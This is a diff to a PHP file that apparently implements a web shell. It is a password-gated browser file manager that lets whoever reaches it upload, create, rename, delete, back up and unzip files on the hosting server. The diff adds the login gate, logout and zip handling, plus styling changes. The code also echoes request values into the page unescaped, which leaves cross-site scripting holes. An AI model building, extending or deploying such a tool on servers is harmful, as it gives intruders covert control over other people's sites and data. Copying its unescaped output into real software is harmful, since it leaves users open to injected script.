@@ -1,10 +1,91 @@
+<?php
+session_start();
+set_time_limit(0);
+$password = '$2y$10$HI5sBrenjZyy88tGWKnCwOLnHf09C5LfLcz09Qe9ZK8M4oLBqXDrO';
+function login() {
+	?>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<style type="text/css">
+		@import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
+		body {
+			font-family: 'Pangolin', cursive;
+			background: rgba(0, 0, 0, 0.3);
+			color: #8a8a8a;
+		}
+		table {
+			position: static;
+			background: #fff;
+			box-shadow: 0px 0px 0px 6px #fff;
+			border-top: 0px solid #fff;
+			border-bottom: 20px solid #fff;
+			border-right: 20px solid #fff;
+			border-left: 20px solid #fff;
+			border-radius:3px;
+			border-spacing:0;
+		}
+		th {
+			padding:12px;
+			font-size:30px;
+			font-weight: bold;
+		}
+		td {
+			border: 6px solid #000;
+			padding:5px;
+			border:none;
+		}
+		input {
+			width:100%;
+			padding:9px;
+			background: rgba(222,222,222,0.73);
+			border:rgba(222,222,222,0.73);
+			outline:none;
+			border-radius:4px;
+		}
+		@media (min-width: 320px) and (max-width: 480px) {
+			table {
+				width:100%;
+			}
+		}
+	</style>
+	<br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+	<form method="post">
+		<table align="center" width="20%">
+			<tr>
+				<thead>
+					<th>LOGIN</th>
+				</thead>
+			</tr>
+			<tr><thead><th></th></thead></tr>
+			<tbody>
+				<tr>
+					<td>
+						<input type="password" name="password">
+					</td>
+				</tr>
+			</tbody>
+		</table>
+	</form>
+	<?php
+	exit();
+}
+function logout() {
+	unset($_SESSION['login']);
+	?> <script>window.location='http://<?= $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'] ?>'</script> <?php
+}
+if (!isset($_SESSION['login'])) {
+	if (empty($password) || (isset($_POST['password']) && (password_verify($_POST['password'], $password)))) {
+		$_SESSION['login'] = true;
+	} else {
+		login();
+	}
+}
+?>
 <title><?= get_current_user() ?></title>
-
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style type="text/css">
-	@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
+	@import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
 	body {
-		font-family: 'Ubuntu Mono', monospace;
+		font-family: 'Pangolin', cursive;
 		background: rgba(0, 0, 0, 0.3);
 		color: #8a8a8a;
 	}
@@ -15,7 +96,7 @@
 		border-bottom: 20px solid #fff;
 		border-right: 20px solid #fff;
 		border-left: 20px solid #fff;
-		border-radius:10px;
+		border-radius:5px;
 		border-spacing:0;
 	}
 	th {
@@ -32,7 +113,7 @@
 	}
 	button {
 		color: #8a8a8a;
-		font-family: 'Ubuntu Mono', monospace;
+		font-family: 'Pangolin', cursive;
 		background:none;
 		border:none;
 	}
@@ -48,17 +129,17 @@
 		cursor:pointer;
 	}
 	textarea {
-		font-family: 'Ubuntu Mono', monospace;
+		font-family: 'Pangolin', cursive;
 		width:100%;
 		color: #8a8a8a;
 		height:350px;
 		resize:none;
-		border:5px solid rgba(222,222,222,0.73);
-		border-radius:10px;
+		border:1px solid rgba(222,222,222,0.73);
+		border-radius:5px;
 	}
 	select {
 		color: #8a8a8a;
-		font-family: 'Ubuntu Mono', monospace;
+		font-family: 'Pangolin', cursive;
 		content: "";
 		padding:4px;
 		background: #fff;
@@ -70,21 +151,21 @@
 	input[type=text] {
 		width:100%;
 		color: #8a8a8a;
-		font-family: 'Ubuntu Mono', monospace;
-		padding:7px;
+		font-family: 'Pangolin', cursive;
+		padding:10px;
 		background: #fff;
-		border-radius:10px;
-		border:5px solid rgba(222,222,222,0.73);
+		border-radius:5px;
+		border:1px solid rgba(222,222,222,0.73);
 	}
 	input[type=submit] {
 		width:100%;
 		color: #8a8a8a;
-		font-family: 'Ubuntu Mono', monospace;
+		font-family: 'Pangolin', cursive;
 		content: "";
-		padding:7px;
-		background: #fff;
+		padding:10px;
+		background: rgba(222,222,222,0.73);
 		border-radius:10px;
-		border:5px solid rgba(222,222,222,0.73);
+		border:1px solid rgba(222,222,222,0.73);
 	}
 	input[type=submit]:focus {
 		border:5px solid #ff9696;
@@ -93,13 +174,13 @@
 	}
 	input[type=submit]:hover {
 		cursor: pointer;
-		border:5px solid #ff9696;
+		border:1px solid #ff9696;
 	}
 	input[type=text]:hover {
-		border:5px solid #ff9696;
+		border:1px solid #ff9696;
 	}
 	textarea:hover {
-		border:5px solid #ff9696;
+		border:1px solid #ff9696;
 	}
 	span.action {
 		font-size:25px;
@@ -204,7 +285,7 @@
 		padding:7px 100px;
 		border-radius:7px;
 		width:70px;
-		font-family: 'Ubuntu Mono', monospace;
+		font-family: 'Pangolin', cursive;
 		text-transform:uppercase;
 		text-align:center;
 		color: #8a8a8a;
@@ -288,6 +369,13 @@
 		select.act {
 			width:100%;
 		}
+		.rw {
+			margin-left:40px;
+		}
+		.br {
+			margin:5px;
+			margin-left:1px;
+		}
 	}
 	/* Smartphones Mobile (Landscape) */
 	@media (min-width: 481px) and (max-width: 767px) {
@@ -323,36 +411,27 @@
 			createCustomalert(txt);
 		}
 	}
-
 	function createCustomalert(txt) {
 		d = document;
-
 		if(d.getElementById("modalContainer")) return;
-
 		mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
 		mObj.id = "modalContainer";
 		mObj.style.height = d.documentElement.scrollHeight + "px";
-	
 		alertObj = mObj.appendChild(d.createElement("div"));
 		alertObj.id = "alertBox";
 		if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
 		alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
 		alertObj.style.visiblity="visible";
-	
 		h1 = alertObj.appendChild(d.createElement("h1"));
 		h1.appendChild(d.createTextNode(alert_TITLE));
-	
 		msg = alertObj.appendChild(d.createElement("p"));
-		//msg.appendChild(d.createTextNode(txt));
 		msg.innerHTML = txt;
-
 		btn = alertObj.appendChild(d.createElement("a"));
 		btn.id = "closeBtn";
 		btn.appendChild(d.createTextNode(alert_BUTTON_TEXT));
 		btn.href = "#";
 		btn.focus();
 		btn.onclick = function() { removeCustomalert();return false; }
-
 		alertObj.style.display = "block";
 	}
 	function removeCustomalert() {
@@ -376,9 +455,9 @@ switch (@$_POST['action']) {
 		if (isset($_POST['newname'])) {
 			$rename = $file->renames($_POST['file'], $_POST['newname']);
 			if ($rename) {
-				alert("success", "rename success");
+				print("<script>alert('rename success')</script>");
 			} else {
-				alert("failed", "rename failed");
+				print("<script>alert('rename failed')</script>");
 			}
 		}
 		switch ($_POST['file']) {
@@ -567,6 +646,8 @@ switch (@$_POST['action']) {
 			if (isset($_POST['dirs'])) {
 				chdir(str_replace(basename($_POST['file']), '', $_POST['file']));
 			}
+		} else {
+			print("<script>alert('delete failed')</script>");
 		}
 		?>
 		<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
@@ -674,8 +755,10 @@ switch (@$_POST['action']) {
 	case 'backup':
 		$file->backup($_POST['file']);
 		break;
+	case 'logout':
+		logout();
+		break;
 }
-$iterator = new DirectoryIterator(cwd());
 ?>
 <tr>
 	<form method="post">
@@ -689,7 +772,9 @@ $iterator = new DirectoryIterator(cwd());
 					   </button>
 					   <button class="tools" name="action" value="upload">UPLOAD</button>
 					   <button class="tools" name="action" value="making">MAKING FILES</button>
-						<input type="hidden" name="destination" value="<?= cwd().DIRECTORY_SEPARATOR.$value ?>"><?php
+					   <button class="tools rw" name="" value="">REWRITE</button>
+					   <button class="tools br" name="action" value="logout">LOGOUT</button>
+					   <input type="hidden" name="destination" value="<?= cwd().DIRECTORY_SEPARATOR.$value ?>"><?php
 					if ($value = 1) {
 						break;
 					}
@@ -701,6 +786,7 @@ $iterator = new DirectoryIterator(cwd());
 	</form>
 </tr>
 <?php
+$iterator = new DirectoryIterator(cwd());
 foreach ($iterator as $dir) {
 	if ($dir->isDir() && $dir != '.' && $dir != '..') {
 		?>
@@ -779,6 +865,18 @@ foreach ($iterator as $files) {
 					<?php
 					$exttension = strtolower(pathinfo($files->getPathname(), PATHINFO_EXTENSION));
 					switch ($exttension) {
+						case 'zip':
+							?>
+							<select class="action" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
+								<option selected>CHOOSE</option>
+								<option value="extract">UNZIP</option>
+								<option value="delete">DELETE</option>
+								<option value="rename">RENAME</option>
+							</select>
+							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
+							<input type="hidden" name="dirs" value="<?= cwd() ?>">
+							<?php
+							break;
 						case 'png':
 						case 'jpg':
 						case 'jpeg':
